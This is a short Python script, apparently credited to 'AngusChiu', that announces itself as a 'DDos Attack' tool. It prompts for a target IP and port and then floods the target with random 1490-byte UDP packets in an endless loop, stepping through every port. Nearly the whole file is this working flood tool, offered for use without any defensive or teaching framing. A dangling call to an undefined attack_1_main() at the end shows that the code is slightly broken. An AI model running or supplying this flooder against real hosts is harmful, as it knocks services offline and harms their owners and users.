import sys
import os
import time
import socket
import random
from datetime import datetime

print('''M""""""'YMM MMP"""""YMM MP""""""`MM MMP"""""""MM M""""""""M M""""""""M MMP"""""""MM MM'""""'YMM M""MMMMM""M
M  mmmm. `M M' .mmm. `M M  mmmmm..M M' .mmmm  MM Mmmm  mmmM Mmmm  mmmM M' .mmmm  MM M' .mmm. `M M  MMMM' .M
M  MMMMM  M M  MMMMM  M M.      `YM M         `M MMMM  MMMM MMMM  MMMM M         `M M  MMMMMooM M       .MM
M  MMMMM  M M  MMMMM  M MMMMMMM.  M M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM M  MMMMMMMM M  MMMb. YM
M  MMMM' .M M. `MMM' .M M. .MMM'  M M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM M. `MMM' .M M  MMMMb  M
M       .MM MMb     dMM Mb.     .dM M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM MM.     .dM M  MMMMM  M
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMM MMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM
''')

# Get current date and time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Use random bytes for the attack
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDos Attack")
print("Author   : AngusChiu")

# ASCII Art (omitted for brevity)

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)    
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print("Sent %s packet to %s through port: %s" % (sent, ip, port))
    
    port += 1
    if port > 65534:
        port = 1
if __name__ == "__main__":
    attack_1_main()